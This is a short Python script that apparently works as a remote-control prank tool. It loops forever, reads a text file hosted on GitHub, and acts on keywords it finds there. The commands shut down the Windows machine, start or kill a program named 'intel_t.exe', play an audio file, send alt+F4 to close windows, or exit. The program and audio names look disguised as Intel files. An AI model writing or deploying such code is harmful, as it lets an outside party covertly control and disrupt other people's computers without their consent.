import os
import keyboard
from bs4 import BeautifulSoup
from urllib.request import urlopen
import re
from pygame import mixer

global text

run = 0
runalt = 0

while True:
    url = "https://github.com/semihcelik8/triggered/blob/main/muck.txt"
    try:
        page = urlopen(url)
        html = page.read().decode("utf-8")
        soup = BeautifulSoup(html, "html.parser")
        order = soup.get_text()
        text = order
    except:
        print("something went wrong!")
    x = re.search("shutdown", text)
    y = re.search("matrix", text)
    c = re.search("close", text)
    z = re.search("rick", text)
    w = re.search("stop", text)
    a = re.search("alt", text)
    r = re.search("release", text)
    e = re.search("exit", text)

    if  x:
        try:
            os.system("shutdown /s")
        except:
            print("something went wrong!")
    if y:
        try:
            os.system("intel_t.exe")
        except:
            print("something went wrong!")
    if c:
        try:
            os.system("taskkill /F /IM intel_t.exe")
        except:
            print("something went wrong!")
    if z:
        try:
            if run == 0:
                mixer.init()
                mixer.music.load("intel_m.mp3")
                mixer.music.play()
                run = 1
        except:
            print("something went wrong!")
    if w:
        try:
            mixer.music.stop()
            run = 0
        except:
            print("something went wrong!")
    if a:
        try:
            if runalt == 0:
                keyboard.send("alt+F4, space")
                runalt = 1
        except:
            print("something went wrong!")
    if r:
        runalt = 0
    if e:
        exit()
